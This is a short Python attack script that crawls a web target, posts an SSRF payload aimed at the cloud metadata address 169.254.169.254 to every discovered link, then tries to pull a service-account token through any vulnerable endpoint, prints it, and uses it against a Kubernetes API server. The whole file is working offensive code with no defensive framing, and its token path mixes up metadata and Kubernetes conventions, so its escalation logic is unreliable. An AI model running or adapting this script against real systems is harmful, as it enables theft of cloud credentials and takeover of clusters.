import requests
from bs4 import BeautifulSoup
import re

# Target URL
BASE_URL = "http://localhost:8080"

# Headers for the requests
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

# Step 1: Crawl the website to discover links
def discover_links(base_url):
    print("[*] Scanning website for links...")
    try:
        response = requests.get(base_url, headers=HEADERS)
        soup = BeautifulSoup(response.text, "html.parser")
        # Extract all href links
        links = set()
        for tag in soup.find_all("a", href=True):
            link = tag["href"]
            # Normalize relative links
            if link.startswith("/"):
                link = base_url + link
            links.add(link)
        print(f"[+] Discovered {len(links)} links:")
        for link in links:
            print(f"    {link}")
        return links
    except Exception as e:
        print(f"[-] Error discovering links: {e}")
        return set()

# Step 2: Check for SSRF vulnerabilities
def test_ssrf(links):
    print("[*] Testing links for SSRF vulnerabilities...")
    ssrf_payload = "http://169.254.169.254/latest/meta-data/"
    vulnerable_endpoints = []
    for link in links:
        try:
            # Send payload to each discovered link
            response = requests.post(link, json={"url": ssrf_payload}, timeout=5)
            if "metadata" in response.text.lower():
                print(f"[!] Vulnerable endpoint found: {link}")
                vulnerable_endpoints.append(link)
        except Exception as e:
            print(f"[-] Error testing {link}: {e}")
    return vulnerable_endpoints

# Step 3: Escalate to Kubernetes API access
def escalate_to_kubernetes(endpoint):
    print(f"[*] Attempting to escalate privileges via {endpoint}...")
    try:
        # Attempt to fetch a token
        response = requests.post(endpoint, json={"url": "http://169.254.169.254/latest/meta-data/serviceaccount/token"}, timeout=5)
        if response.status_code == 200:
            token = response.text.strip()
            print(f"[+] Successfully retrieved Kubernetes token: {token}")
            # Use token to access the Kubernetes API
            kube_api_server = f"https://localhost:6443"
            headers = {"Authorization": f"Bearer {token}"}
            kube_response = requests.get(f"{kube_api_server}/api/v1/nodes", headers=headers, verify=False)
            if kube_response.status_code == 200:
                print("[+] Successfully accessed Kubernetes API. Nodes:")
                print(kube_response.json())
            else:
                print("[-] Failed to access Kubernetes API.")
        else:
            print("[-] Failed to retrieve Kubernetes token.")
    except Exception as e:
        print(f"[-] Error escalating privileges: {e}")

# Main function
if __name__ == "__main__":
    print("[*] Starting web scan and attack...")
    links = discover_links(BASE_URL)
    if links:
        vulnerable_endpoints = test_ssrf(links)
        if vulnerable_endpoints:
            for endpoint in vulnerable_endpoints:
                escalate_to_kubernetes(endpoint)
        else:
            print("[-] No SSRF vulnerabilities detected.")
    else:
        print("[-] No links discovered.")
